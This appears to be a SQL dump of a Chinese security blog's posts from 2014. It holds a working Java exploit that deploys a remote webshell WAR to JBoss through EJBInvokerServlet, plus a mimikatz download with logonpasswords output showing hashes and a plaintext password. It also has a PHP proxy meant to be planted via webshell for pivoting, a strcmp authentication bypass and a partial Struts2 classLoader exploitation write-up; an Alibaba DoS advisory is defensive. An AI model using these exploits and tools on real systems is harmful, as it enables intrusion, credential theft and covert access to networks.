port不需填写\n3、war包推荐使用:http://javaweb.org/is.war,is.war里面带有几个版本的一句话和一个cmd.jsp\n(如:http://xxx.com/is/?cmd.jsp?pwd=023&amp;cmd=ls)如果使用自己的war包,\ncmd功能需要默认配置(/is/cmd.jsp)war包只自带了mysql数据库所需要的jar,\n连接oracle等其他数据库需要自己添加jar包</pre>\n<p>截图-JMX/EJBInvokerServlet:</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2014/03/111.jpg\"><img class=\"alignnone size-full wp-image-1073\" src=\"http://javaweb.org/wp-content/uploads/2014/03/111.jpg\" alt=\"1\" width=\"814\" height=\"551\" /></a></p>\n<p>截图-HtmlAdaptor:</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2014/03/2.jpg\"><img class=\"alignnone size-full wp-image-822\" title=\"2\" src=\"http://javaweb.org/wp-content/uploads/2014/03/2.jpg\" alt=\"\" width=\"814\" height=\"551\" /></a></p>\n<p>核心源码：</p>\n<pre class=\"brush: java; gutter: true\">package org.javaweb.jboss;\nimport java.io.BufferedReader;\nimport java.io.ByteArrayOutputStream;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.net.InetSocketAddress;\nimport java.net.URL;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SocketChannel;\nimport java.util.ArrayList;\nimport java.util.List;\npublic class Test {\n	byte[] a1 = new byte[]{\n		(byte) 0xac,(byte) 0xed,0x00,0x05,0x73,0x72,0x00,0x29,0x6f,0x72,0x67,0x2e,0x6a,0x62,0x6f,0x73, 								// ....sr.) org.jbos\n		0x73,0x2e,0x69,0x6e,0x76,0x6f,0x63,0x61,0x74,0x69,0x6f,0x6e,0x2e,0x4d,0x61,0x72, 											// s.invoca tion.Mar\n		0x73,0x68,0x61,0x6c,0x6c,0x65,0x64,0x49,0x6e,0x76,0x6f,0x63,0x61,0x74,0x69,0x6f,											// shalledI nvocatio\n		0x6e,(byte) 0xf6,0x06,(byte) 0x95,0x27,0x41,0x3e,(byte) 0xa4,(byte) 0xbe,0x0c,0x00,0x00,0x78,0x70,0x70,0x77,				// n...&#039;A&gt;. ....xppw\n		0x08,0x78,(byte) 0x94,(byte) 0x98,0x47,(byte) 0xc1,(byte) 0xd0,0x53,(byte) 0x87,0x73,0x72,0x00,0x11,0x6a,0x61,0x76,			// .x..G..S .sr..jav\n		0x61,0x2e,0x6c,0x61,0x6e,0x67,0x2e,0x49,0x6e,0x74,0x65,0x67,0x65,0x72,0x12,(byte) 0xe2,										// a.lang.I nteger..\n		(byte) 0xa0,(byte) 0xa4,(byte) 0xf7,(byte) 0x81,(byte) 0x87,0x38,0x02,0x00,0x01,0x49,0x00,0x05,0x76,0x61,0x6c,0x75,			// .....8.. .I..valu\n		0x65,0x78,0x72,0x00,0x10,0x6a,0x61,0x76,0x61,0x2e,0x6c,0x61,0x6e,0x67,0x2e,0x4e,											// exr..jav a.lang.N\n		0x75,0x6d,0x62,0x65,0x72,(byte) 0x86,(byte) 0xac,(byte) 0x95,0x1d,0x0b,(byte) 0x94,(byte) 0xe0,(byte) 0x8b,0x02,0x00,0x00,	// umber... ........\n		0x78,0x70,0x26,(byte) 0x95,(byte) 0xbe,0x0a,0x73,0x72,0x00,0x24,0x6f,0x72,0x67,0x2e,0x6a,0x62,								// xp&amp;...sr .$org.jb\n		0x6f,0x73,0x73,0x2e,0x69,0x6e,0x76,0x6f,0x63,0x61,0x74,0x69,0x6f,0x6e,0x2e,0x4d,											// oss.invo cation.M\n		0x61,0x72,0x73,0x68,0x61,0x6c,0x6c,0x65,0x64,0x56,0x61,0x6c,0x75,0x65,(byte) 0xea,(byte) 0xcc,								// arshalle dValue..\n		(byte) 0xe0,(byte) 0xd1,(byte) 0xf4,0x4a,(byte) 0xd0,(byte) 0x99,0x0c,0x00,0x00,0x78,0x70,0x77\n	};\n	byte[] aa = new byte[]{(byte) 0xeb,0x0,0x0,0x0,(byte) 0xe3};\n	byte[] ab = new byte[]{0x0,0x15};\n	byte[] a2 = new byte[]{\n		(byte) 0xac,(byte) 0xed,0x00,0x05,0x75,0x72,0x00,0x13,0x5b,0x4c,0x6a,0x61,0x76,0x61,0x2e,									// .....ur. .[Ljava.\n		0x6c,0x61,0x6e,0x67,0x2e,0x4f,0x62,0x6a,0x65,0x63,0x74,0x3b,(byte) 0x90,(byte) 0xce,0x58,(byte) 0x9f,						// lang.Obj ect;..X.\n		0x10,0x73,0x29,0x6c,0x02,0x00,0x00,0x78,0x70,0x00,0x00,0x00,0x04,0x73,0x72,0x00,											// .s)l...x p....sr.\n		0x1b,0x6a,0x61,0x76,0x61,0x78,0x2e,0x6d,0x61,0x6e,0x61,0x67,0x65,0x6d,0x65,0x6e,											// .javax.m anagemen\n		0x74,0x2e,0x4f,0x62,0x6a,0x65,0x63,0x74,0x4e,0x61,0x6d,0x65,0x0f,0x03,(byte) 0xa7,0x1b,										// t.Object Name....\n		(byte) 0xeb,0x6d,0x15,(byte) 0xcf,0x03,0x00,0x00,0x78,0x70,0x74,0x00,0x21,0x6a,0x62,0x6f,0x73,								// .m.....x pt.!jbos\n		0x73,0x2e,0x73,0x79,0x73,0x74,0x65,0x6d,0x3a,0x73,0x65,0x72,0x76,0x69,0x63,0x65,											// s.system :service\n		0x3d,0x4d,0x61,0x69,0x6e,0x44,0x65,0x70,0x6c,0x6f,0x79,0x65,0x72,0x78,0x74,0x00,											// =MainDep loyerxt.\n		0x06,0x64,0x65,0x70,0x6c,0x6f,0x79,0x75,0x71,0x00,0x7e,0x00,0x00,0x00,0x00,0x00,											// .deployu q.~.....\n		0x01,0x74\n	};\n	byte[] a3 = new byte[]{\n		0x75,0x72,0x00,\n		0x13,0x5b,0x4c,0x6a,0x61,0x76,0x61,0x2e,0x6c,0x61,																			// ur..[ Ljava.la\n		0x6e,0x67,0x2e,0x53,0x74,0x72,0x69,0x6e,0x67,0x3b,(byte) 0xad,(byte) 0xd2,0x56,(byte) 0xe7,(byte) 0xe9,0x1d,				// ng.Strin g;..V...\n		0x7b,0x47,0x02,0x00,0x00,0x78,0x70,0x00,0x00,0x00,0x01,0x74,0x00,0x10,0x6a,0x61,											// {G...xp. ...t..ja\n		0x76,0x61,0x2e,0x6c,0x61,0x6e,0x67,0x2e,0x53,0x74,0x72,0x69,0x6e,0x67\n	};\n	byte[] a4 = new byte[]{\n		0x0d,(byte) 0xd3,\n		(byte) 0xbe,(byte) 0xc9,0x78,0x77,0x04,0x00,0x00,0x00,0x01,0x73,0x72,0x00,0x22,0x6f,0x72,0x67,								// ..xw.... .sr.&quot;org\n		0x2e,0x6a,0x62,0x6f,0x73,0x73,0x2e,0x69,0x6e,0x76,0x6f,0x63,0x61,0x74,0x69,0x6f,											// .jboss.i nvocatio\n		0x6e,0x2e,0x49,0x6e,0x76,0x6f,0x63,0x61,0x74,0x69,0x6f,0x6e,0x4b,0x65,0x79,(byte) 0xb8,										// n.Invoca tionKey.\n		(byte) 0xfb,0x72,(byte) 0x84,(byte) 0xd7,(byte) 0x93,(byte) 0x85,(byte) 0xf9,0x02,0x00,0x01,0x49,0x00,0x07,0x6f,0x72,0x64,	// .r...... ..I..ord\n		0x69,0x6e,0x61,0x6c,0x78,0x70,0x00,0x00,0x00,0x05,0x73,0x71,0x00,0x7e,0x00,0x05,											// inalxp.. ..sq.~..\n		0x77,0x0d,0x00,0x00,0x00,0x05,(byte) 0xac,(byte) 0xed,0x00,0x05,0x70,(byte) 0xfb,0x57,(byte) 0xa7,(byte) 0xaa,0x78,			// w....... ..p.W..x\n		0x77,0x04,0x00,0x00,0x00,0x03,0x73,0x71,0x00,0x7e,0x00,0x07,0x00,0x00,0x00,0x04,											// w.....sq .~......\n		0x73,0x72,0x00,0x23,0x6f,0x72,0x67,0x2e,0x6a,0x62,0x6f,0x73,0x73,0x2e,0x69,0x6e,											// sr.#org. jboss.in\n		0x76,0x6f,0x63,0x61,0x74,0x69,0x6f,0x6e,0x2e,0x49,0x6e,0x76,0x6f,0x63,0x61,0x74,											// vocation .Invocat\n		0x69,0x6f,0x6e,0x54,0x79,0x70,0x65,0x59,(byte) 0xa7,0x3a,0x1c,(byte) 0xa5,0x2b,0x7c,(byte) 0xbf,0x02,						// ionTypeY .:..+|..\n		0x00,0x01,0x49,0x00,0x07,0x6f,0x72,0x64,0x69,0x6e,0x61,0x6c,0x78,0x70,0x00,0x00,											// ..I..ord inalxp..\n		0x00,0x01,0x73,0x71,0x00,0x7e,0x00,0x07,0x00,0x00,0x00,0x0a,0x70,0x74,0x00,0x0f,											// ..sq.~.. ....pt..\n		0x4a,0x4d,0x58,0x5f,0x4f,0x42,0x4a,0x45,0x43,0x54,0x5f,0x4e,0x41,0x4d,0x45,0x73,											// JMX_OBJE CT_NAMEs\n		0x72,0x00,0x1b,0x6a,0x61,0x76,0x61,0x78,0x2e,0x6d,0x61,0x6e,0x61,0x67,0x65,0x6d,											// r..javax .managem\n		0x65,0x6e,0x74,0x2e,0x4f,0x62,0x6a,0x65,0x63,0x74,0x4e,0x61,0x6d,0x65,0x0f,0x03,											// ent.Obje ctName..\n		(byte) 0xa7,0x1b,(byte) 0xeb,0x6d,0x15,(byte) 0xcf,0x03,0x00,0x00,0x78,0x70,0x74,0x00,0x21,0x6a,0x62,						// ...m.... .xpt.!jb\n		0x6f,0x73,0x73,0x2e,0x73,0x79,0x73,0x74,0x65,0x6d,0x3a,0x73,0x65,0x72,0x76,0x69,											// oss.syst em:servi\n		0x63,0x65,0x3d,0x4d,0x61,0x69,0x6e,0x44,0x65,0x70,0x6c,0x6f,0x79,0x65,0x72,0x78,											// ce=MainD eployerx\n		0x78\n	};\n	public void send(String host,int port,byte[] requestData) throws Exception {\n		try {\n			SocketChannel socketChannel = SocketChannel.open();\n			socketChannel.socket().connect(new InetSocketAddress(host,port),5000);\n			socketChannel.configureBlocking(false);\n			ByteBuffer byteBuffer = ByteBuffer.allocate(512);\n			socketChannel.write(ByteBuffer.wrap(requestData));\n			while (true) {\n				byteBuffer.clear();\n				int readBytes = socketChannel.read(byteBuffer);\n				if (readBytes &gt; 0) {\n					byteBuffer.flip();\n					socketChannel.close();\n					break;\n				}\n			}\n		} catch (IOException e) {\n			throw e;\n		}\n	}\n	protected void addByte(List&lt;Byte&gt; ls,byte[] b){\n		for(byte bb:b){\n			ls.add(bb);\n		}\n	}\n	protected byte[] toByteArray(Byte[] b){\n		ByteArrayOutputStream bos = new ByteArrayOutputStream();\n		for(byte bs:b){\n			bos.write(bs);\n		}\n		return bos.toByteArray();\n	}\n	public String request(String url) throws Exception{\n    	String str = &quot;&quot;,tmp;\n    	BufferedReader br = new BufferedReader(new InputStreamReader(new URL(url).openStream()));\n		while((tmp=br.readLine())!=null){\n			str+=tmp+&quot;\\r\\n&quot;;\n		}\n		return str;\n	}\n	public void testEJBInvokerServlet(String host,int port,String war) throws Exception{\n		List&lt;Byte&gt; ls = new ArrayList&lt;Byte&gt;();\n		addByte(ls, a1);\n		addByte(ls,aa);\n		addByte(ls, a2);\n		addByte(ls, ab);\n		addByte(ls, war.getBytes());\n		addByte(ls, a3);\n		addByte(ls, a4);\n		byte[] b = toByteArray(ls.toArray(new Byte[ls.size()]));\n		String req = &quot;POST /invoker/EJBInvokerServlet/ HTTP/1.1\\r\\n&quot;+\n				&quot;ContentType: application/x-java-serialized-object; class=org.jboss.invocation.MarshalledInvocation\\r\\n&quot;+\n				&quot;Accept-Encoding: x-gzip,x-deflate,gzip,deflate\\r\\n&quot;+\n				&quot;User-Agent: Java/1.6.0_21\\r\\n&quot;+\n				&quot;Host: &quot;+host+&quot;:&quot;+port+&quot;\\r\\n&quot;+\n				&quot;Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2\\r\\n&quot;+\n				&quot;Connection: keep-alive\\r\\n&quot;+\n				&quot;Content-type: application/x-www-form-urlencoded\\r\\n&quot;+\n				&quot;Content-Length: &quot;+b.length+&quot;\\r\\n\\r\\n&quot;;\n		ls.clear();\n		addByte(ls, req.getBytes());\n		addByte(ls, b);\n		send(host,port,toByteArray(ls.toArray(new Byte[ls.size()])));\n	}\n}</pre>', null, '2014-03-05 15:07:40', '1', '1030', null, '13', '2015-04-22 20:42:00');
INSERT INTO `sys_posts` VALUES ('833', '1', '13', 'Struts2 最新S2-020 拒绝服务漏洞', '园长', '官方发布最新的漏洞更新说明：<a href=\"http://struts.apache.org/release/2.3.x/docs/s2-020.html\">http://struts.apache.org/release/2.3.x/docs/s2-020.html</a>，这个问题其实是由于之前的apache-commons-fileupload影响导致拒绝服务。\n<p>在p2j之前也发过：<a href=\"http://javaweb.org/?p=670\">Apache Commons FileUpload 和 Apache Tomcat 拒绝服务</a>。</p>', null, '2014-03-07 17:35:04', '1', '525', null, '0', '2014-03-07 17:35:04'), ('835', '5', '13', '[asrc-公告]J2EE框架DDoS漏洞预警公告', 'Anonymous', '阿里发布commons-fileupload DDOS预警了，尽快更新jar包还有就是珍爱生命远离Struts2，或许项目刚上线迎来的是一个新的S2漏洞。本文相关：<a href=\"http://javaweb.org/?p=833\">Struts2 最新S2-020 拒绝服务漏洞</a>  <a href=\"http://javaweb.org/?p=670\">Apache Commons FileUpload 和 Apache Tomcat 拒绝服务</a>\n<p>原文:<a href=\"http://security.alibaba.com/announcement/notice_10.htm?spm=0.0.0.0.SNp5gK\">J2EE框架DDoS漏洞预警公告</a></p>\n<p><strong>公告编号：ASRC-2014-4</strong></p>\n<p><strong>公告来源：阿里巴巴集团安全应急响应中心</strong></p>\n<p><strong>公告日期：2014-3-10</strong></p>\n<p><strong>公告内容：</strong></p>\n<p><p align=\"center\"><strong>J2EE框架DDoS漏洞预警</strong></p></p>\n<p><table id=\"blue\" width=\"771\" border=\"1\" cellspacing=\"1\" cellpadding=\"1\"></p>\n<p><tbody></p>\n<p><tr></p>\n<p><td align=\"left\" valign=\"center\" width=\"184\"><strong>已确认被成功利用的软件及系统</strong></td></p>\n<p><td align=\"left\" width=\"587\">  大部分常见J2EE WEB框架</p>\n<p>STRUTS1全版本（只影响使用uploadform的action）</p>\n<p>STRUTS2全版本（任何一个action都受影响）</p>\n<p>Spring MVC全版本（任何一个controller都受影响）所有使用了apache commons fileupload的组件的应用，包括纯JSP页面</p>\n<p>Commons FileUpload 1.0 to 1.3部分服务器自带了upload组件，可以直接让JSP调用</p>\n<p>Apache Tomcat 8.0.0-RC1 to 8.0.1</p>\n<p>Apache Tomcat 7.0.0 to 7.0.50</p>\n<p>JBOSS由于重用tomcat源码所以受到影响</td></p>\n<p></tr></p>\n<p><tr></p>\n<p><td align=\"center\" valign=\"middle\" width=\"184\"><strong>漏洞描述</strong></td></p>\n<p><td align=\"left\"> Apache Commons FileUpload 1.3在处理mime-multipart请求时，攻击者可以构造一个包含异常http头的请求，使得apache fileupload进入无限循环，导致CPU爆满，从而发起拒绝服务攻击。</p>\n<p>PID   COMMAND   %CPU8070   mdworker     1.3</p>\n<p>8069   sleep           0.0</p>\n<p>8066   top             11.2</p>\n<p>8064   java            101.2</p>\n<p>这个漏洞可以用于攻击大多数J2EE框架，常见J2EE框架，总会默认使用FileUpload组件，并且在所有用户代码前完成上传文件的预处理，这导致无论开发者是否手工调用该组件，都会默认执行。</p>\n<p>此漏洞的POC已经被攻击者发布，请尽快修补该问题，以免造成损失。</p>\n<p>ps：如果运维过程中，发现CPU无故飙升，可以优先考虑这个因素。</td></p>\n<p></tr></p>\n<p><tr></p>\n<p><td align=\"center\" valign=\"center&quot;\" width=\"184\"><strong>漏洞检测方法</strong></td></p>\n<p><td align=\"left\"> Commons FileUpload小于1.3.1</td></p>\n<p></tr></p>\n<p><tr></p>\n<p><td align=\"center\" valign=\"center\" width=\"184\"><strong>建议修补方案</strong></td></p>\n<p><td align=\"left\"> 升级Apache Commons FileUpload 1.3.1 或之后版本</p>\n<p>升级Apache Tomcat 8.0.2 或之后版本</p>\n<p>升级 Apache Tomcat 7.0.51 或之后版本</p>\n<p>详情参考：</p>\n<p>http://markmail.org/message/kpfl7ax4el2owb3o</p>\n<p>http://tomcat.apache.org/security-8.html http://tomcat.apache.org/security-7.html</td></p>\n<p></tr></p>\n<p></tbody></p>\n<p></table></p>', null, '2014-03-11 10:49:32', '1', '555', null, '0', '2014-03-12 14:05:45'), ('842', '1', '12', 'mimikatz 2.0 alpha trunk+源码', '园长', 'mimikatz 2.0 alpha似乎早就发布了，看google-code(<a href=\"https://code.google.com/p/mimikatz/\">google-code-mimikatz</a>)貌似作者更新了。为小伙伴儿们下载了源码和二进制文件。\n<p>下载地址：<a href=\"http://pan.baidu.com/s/1qWnVuKs\">mimikatz 2.0 alpha_trunk+源码</a></p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2014/03/22.jpg\"><img class=\"alignnone size-full wp-image-845\" title=\"2\" src=\"http://javaweb.org/wp-content/uploads/2014/03/22.jpg\" alt=\"\" width=\"986\" height=\"539\" /></a></p>\n<p>TSRC:</p>\n<p>日前著名黑客工具mimikatz更新到2.0，新功能包括能够通过获取的kerberos登录凭据，绕过支持RestrictedAdmin模式的win8或win2012svr的远程终端(RDP)的登陆认证。建议默认禁止RestrictedAdmin模式登录。</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2014/03/1.jpeg\"><img class=\"alignnone size-full wp-image-843\" title=\"1\" src=\"http://javaweb.org/wp-content/uploads/2014/03/1.jpeg\" alt=\"\" width=\"460\" height=\"264\" /></a></p>\n<pre>mimikatz:</pre>\n<pre class=\"brush: c; gutter: true\">mimikatz # privilege::debug\nPrivilege &#039;20&#039; OK\nmimikatz # sekurlsa::logonpasswords\nAuthentication Id : 0 ; 515764 (00000000:0007deb4)\nSession           : Interactive from 2\nUser Name         : Gentil Kiwi\nDomain            : vm-w7-ult-x\nSID               : S-1-5-21-1982681256-1210654043-1600862990-1000\n        msv :\n         [00000003] Primary\n         * Username : Gentil Kiwi\n         * Domain   : vm-w7-ult-x\n         * LM       : d0e9aee149655a6075e4540af1f22d3b\n         * NTLM     : cc36cf7a8514893efccd332446158b1a\n         * SHA1     : a299912f3dc7cf0023aef8e4361abfc03e9a8c30\n        tspkg :\n         * Username : Gentil Kiwi\n         * Domain   : vm-w7-ult-x\n         * Password : waza1234/\n...</pre>', null, '2014-03-11 12:07:46', '1', '546', null, '0', '2014-03-11 12:10:27'), ('870', '5', '14', '[wooyun-zone]只有webshell，一样可以做代理', 'Anonymous', '原文<a href=\"http://zone.wooyun.org/user/xsjswt\">xsjswt</a>：http://zone.wooyun.org/content/11096\n<p>有时候要代理进内网，但是服务器没有外网端口，也没法执行命令反弹lcx什么的，也没有提权什么什么的，只有一个webshell，这个时候就比较蛋疼了。</p>\n<p>鄙人不才，写了一个比较山寨的php+nginx反向代理，可以比较容易的实现这个功能。</p>\n<p>架设起来也算是比较方便了。就把这个用webshell也好，上传漏洞也好，甩到对方服务器上。</p>\n<p>然后配置一下本地的nginx，做一个反向代理+rewrite就OK。</p>\n<p>先看代码</p>\n<p>proxy.php</p>\n<pre class=\"brush: php; gutter: true\">&lt;?php \nif(!isset($_GET[&#039;url&#039;])){ \n  exit(0); \n} \n$ch = curl_init(); \n$url=$_GET[&#039;url&#039;]; \nif(strstr($url,&#039;?&#039;)){ \n  $url.=&#039;&amp;&#039;; \n} \nelse{ \n  $url.=&#039;?&#039;; \n} \nunset($_GET[&#039;url&#039;]); \nforeach($_GET as $Key=&gt;$Val){ \n  if(get_magic_quotes_gpc()){ \n    $Val=stripslashes($Val); \n  } \n  $url=$url.&#039;&amp;&#039;.$Key.&#039;=&#039;.urlencode($Val); \n} \n$cookie=&#039;&#039;; \nforeach($_COOKIE as $Key=&gt;$Val){ \n  if(get_magic_quotes_gpc()){ \n    $Val=stripslashes($Val); \n  } \n  $cookie=$cookie.$Key.&#039;=&#039;.urlencode($Val).&#039;; &#039;; \n} \nif($_SERVER[&#039;REQUEST_METHOD&#039;]==&quot;POST&quot;){ \n  curl_setopt($ch, CURLOPT_POST, 1); \n  $post_data=&#039;&#039;; \n  foreach($_POST as $Key=&gt;$Val){ \n    if(get_magic_quotes_gpc()){ \n      $Val=stripslashes($Val); \n    } \n    $post_data=$post_data.&#039;&amp;&#039;.$Key.&#039;=&#039;.urlencode($Val); \n  } \n  curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data); \n} \ncurl_setopt($ch, CURLOPT_URL, $url); \ncurl_setopt($ch, CURLOPT_USERAGENT, $_SERVER[&#039;HTTP_USER_AGENT&#039;]); \ncurl_setopt($ch, CURLOPT_COOKIE, $cookie); \ncurl_setopt($ch, CURLOPT_HEADER, TRUE); \ncurl_setopt($ch, CURLOPT_NOBODY, FALSE); \ncurl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE); \nif(isset($_SERVER[&#039;HTTP_REFERER&#039;])){ \n  curl_setopt($ch, CURLOPT_REFERER, $_SERVER[&#039;HTTP_REFERER&#039;]); \n} \n$Response=curl_exec($ch); \nif(!$Response){ \n  curl_close($ch); \n  exit(0); \n} \n$HttpStatus=curl_getinfo($ch,CURLINFO_HTTP_CODE); \n$Header=substr($Response,0,curl_getinfo($ch, CURLINFO_HEADER_SIZE)); \n$Body=substr($Response,curl_getinfo($ch, CURLINFO_HEADER_SIZE)); \n$Headers=split(&quot;\\r\\n&quot;,$Header); \nforeach($Headers as $ThusHead){ \n  if($ThusHead == &#039;Transfer-Encoding: chunked&#039; || strstr($ThusHead,&#039;Content-Length&#039;)!==false){ \n    continue; \n  } \n  header($ThusHead,FALSE); \n} \necho $Body; \ncurl_close($ch); \n?&gt;</pre>\n<p>代码很简单，也有一些简单的小bug，不知各位看官看出来没有，我也懒得去修改了。</p>\n<p>另外就是:</p>\n<p>1. 这个代理只支持基本的GET/POST并不支持上传文件，有兴趣的可以自己看看，搞搞，搞完发出来，造福大家</p>\n<p>2. 这个代理在转发post请求的时候，用的并不是www-url-encode，所以，也许会有的程序识别不正常</p>\n<p>然后在本地的nginx里面新加一个配置</p>\n<pre class=\"brush: actionscript3; gutter: true\"># proxy webshell \n    server { \n        listen          这里写监听端口; \n        location ~ () { \n                proxy_pass              http://webshell的IP/文件/存放/目录/proxy.php?url=http://$host/$request_uri; \n                proxy_set_header        Host    &quot;访问webshell用域名&quot;; \n        } \n    }</pre>\n<p>然后重新加载一下nginx配置，配置浏览器使用nginx监听的端口做为代理，就可以使了。</p>\n<p>给个效果图。</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2014/03/12.jpg\"><img class=\"alignnone size-full wp-image-871\" title=\"1\" src=\"http://javaweb.org/wp-content/uploads/2014/03/12.jpg\" alt=\"\" width=\"869\" height=\"522\" /></a></p>', null, '2014-03-12 11:01:24', '1', '615', null, '0', '2014-03-12 13:52:09'), ('876', '5', '14', '[wooyun-zone]PHP的strcmp函数引发的安全问题', 'Anonymous', '原文：<a href=\"http://zone.wooyun.org/content/11124\">http://zone.wooyun.org/content/11124</a>\n<p>在官方的文档有这么一端说明：</p>\n<pre class=\"brush: actionscript3; gutter: true\">Note a difference between 5.2 and 5.3 versions \necho (int)strcmp(&#039;pending&#039;,array()); \nwill output -1 in PHP 5.2.16 (probably in all versions prior 5.3) \nbut will output 0 in PHP 5.3.3 \nOf course, you never need to use array as a parameter in string comparisions.</pre>\n<p>大概意思就是5.3的之前和之后版本在使用strcmp比较数组和字符串时候的差异。</p>\n<p>在5.3的版本之后使用这个函数比较会返回0，太令人迷恋了。。。</p>\n<pre class=\"brush: php; gutter: true\">&lt;?php \n#$a=&#039;Hello world!&#039;; \n$password=$_GET[&#039;password&#039;]; \n#$a=True; \n#echo gettype($a); \nif(strcmp(&#039;Firebroo&#039;,$password)){ \n  echo &#039;NO!&#039;; \n}else{ \n  echo &#039;YES!&#039;; \n} \n#echo ord(&#039;a&#039;); \n?&gt;</pre>\n<p>这样一段代码，原本的意图是输入Firebroo才能获得权限，但是在5.3版本之后捏，You just need input an array ，like this（?password[]=1）</p>\n<p>看图</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2014/03/13.jpg\"><img class=\"alignnone size-full wp-image-877\" title=\"1\" src=\"http://javaweb.org/wp-content/uploads/2014/03/13.jpg\" alt=\"\" width=\"824\" height=\"529\" /></a></p>\n<p>跳过了验证，少年，上吧。。</p>', null, '2014-03-13 18:02:21', '1', '531', null, '0', '2014-03-24 11:32:38'), ('896', '5', '14', 'Struts2的getClassLoader漏洞利用', 'Anonymous', '原文：<a href=\"http://security.alibaba.com/blog/blog_3.htm?spm=0.0.0.0.sY8iKo\">http://security.alibaba.com/blog/blog_3.htm?spm=0.0.0.0.sY8iKo</a>\n<p><h2><span style=\"font-size: 1.5em;\">0x00 摘要</span></h2></p>\n<p><hr /></p>\n<p>2012年，我在<a href=\"http://www.inbreak.net/?spm=0.0.0.0.lxJSWS&amp;p=477\">《攻击JAVA WEB》</a>，文中提多关于“classLoader导致特定环境下的DOS漏洞”，当时并没有更加深入的说明，这几天struts官方修补了这个漏洞，本文是对这个漏洞的深入研究。</p>\n<p><h2>0x01 正文</h2></p>\n<p><hr /></p>\n<p>这一切，得从我们控制了classLoader说起，曾经写过一篇文章，提到了一个小小的技术细节，非常不起眼的一个鸡肋。 引用<a href=\"http://www.inbreak.net/?spm=0.0.0.0.lxJSWS&amp;p=377\">《Spring framework（cve-2010-1622）漏洞利用指南》</a>：</p>\n<p><blockquote>Struts2其实也本该是个导致远程代码执行漏洞才对，只是因为它的字段映射问题，只映射基础类型，默认不负责映射其他类型，所以当攻击者直接提交URLs[0]=xxx时，直接爆字段类型转换错误，结果才侥幸逃过一劫罢了。</blockquote></p>\n<p>tomcat8.0出来后，这个问题爆发了，这是一个鸡肋漏洞的逆袭。</p>\n<p>在struts2任何一个action运行之前，一旦接受到用户提交参数xx=zzzzz时，就由Ognl负责调用对应的当前action的setXxx方法，至于set方法到底是干什么的，其实不重要，里面的逻辑也不重要，我们只关注这个方法调用了，参数传递了。这种对属性的改变，有时候是可以很大程度的影响后续复杂逻辑。</p>\n<p><h3>普及一点基础</h3></p>\n<p>Object是java的基础类，所有的class生成的对象，都会继承Object的所有属性和方法，因此当前action无论是什么代码，必须有Object自带的getClass方法，这个方法会返回一个Class对象，Class对象又一定会有getClassLoader方法，最终在每个action都可以</p>\n<p><div></p>\n<p><div id=\"highlighter_542310\"></p>\n<p><table border=\"0\" cellspacing=\"0\" cellpadding=\"0\"></p>\n<p><tbody></p>\n<p><tr></p>\n<p><td></p>\n<p><div>1</div></td></p>\n<p><td></p>\n<p><div></p>\n<div><code>getClass().getClassLoader()</code></div>\n</div></td>\n</tr>\n</tbody>\n</table>\n</div>\n</div>\n拿到当前的ClassLoader。\n我研究这个问题，在几年前了，这个东西理解起来不容易，尤其是各个web容器不一致，刚巧当时有个阿里巴巴内部《tomcat等容器的classLoader加载原理》培训，收获匪浅。本文篇幅有限，简单的讲一下。\n在JRE启动中，每个Class都会有自己的ClassLoader。web容器，为了方便的管理启动过程，通常都有实现自定义的ClassLoader。《Spring framework》的漏洞的利用场景真的非常幸运，利用了web容器的特性getURLs方法，所有容器的servlet的ClassLoader都会通过继承父类UrlClassLoader得到getURLs这个方法，所以这个漏洞可以不受容器影响。事实上，每个容器的ClassLoader都是自己实现的，环境必然会有所不同，那次struts2侥幸逃过一劫，所以我的一个关注点，一都放在几大web容器的ClassLoader代码变化上，哪天看到tomcat8居然把resources放进ClassLoader上，而ServletContext刚巧挂在resources上，顿时知道肉戏来了。\n<h3>上传webshell的可能性研究</h3>\n多次的远程代码执行漏洞洗礼，我一直在脑海里模拟“ServletContext被控制了，这次能干什么”，究竟有哪些路线，可以通往代码执行的领域。\n比如：Struts2会去servletContext里取到一个值，然后把它作为Ognl执行掉。这个太简单了，我自己都不信。\nOgnl的Context树形结构：\n<img src=\"http://wydrops-wordpress.stor.sinaapp.com/uploads/2014/03/j1.png\" alt=\"enter image description here\" />\nservletContext被转换成Map，变成了图中的application子项，这个位址很尴尬，如果是上一层Node，从上到下找到value Stack，确实有实现这个思路的可能，但现在看来，这条路断了，它不支持找到父节点。经过多次找寻后，确认Ognl出局，只能从web容器本身入手。\n运行在Tomcat8下的struts，在随便哪个action代码中，插入这段，下断点，\n<pre class=\"brush: java; gutter: true\">this.getClass().getClassLoader();</pre>\n<a href=\"http://javaweb.org/wp-content/uploads/2014/03/1.png\"><img class=\"alignnone size-full wp-image-897\" title=\"1\" src=\"http://javaweb.org/wp-content/uploads/2014/03/1.png\" alt=\"\" width=\"627\" height=\"273\" /></a>\n任何一个Action的classLoader都是org.apache.catalina.loader.WebappClassLoader，这是漏洞的源头。\n我的思路，是给context赋予初始化参数readOnly=false。因为在tomcat上，所有的请求，都会默认由defaultServlet上处理，或者由jspServet处理。只要在context初始化时，readOnly=false，接下来defaultServlet就会真的处理PUT请求DELETE请求等等大威力请求，于是我们可以直接PUT文件上来。\n这个思路的前提，是defaultservlet再被初始化一次。现实很残酷，这个思路最终没有得到执行，原因是servlet只会初始化一次，而readOnly属性只有在servlet初始化时，才会真的给servet的readOnly属性赋值。这次突破，宣告失败。\n<h3>几个这个漏洞的调试小技巧：</h3>\n<strong>1. 仅仅从debug上查看ognl的赋值情况，是不准确的，debug只能看到这个类定义好的变量。</strong>\n如果有一个代码是这样的：\n<pre class=\"brush: java; gutter: true\">public void setName(String name){…}</pre>\n但是并没有定义过这个属性，这时debug无法看到这个东西，但是其实ognl可以直接通过name=zzzzz调用，并且能把zzzz传递过去。\n<strong>2. 或者只有一个私有属性，但是没有set方法，其实也是ognl不能赋值的。</strong>\n这个debug，观察这个漏洞时，仅仅是个参考，要真正深入进去看代码才能和ognl的视线保持一致。\n<strong>3. 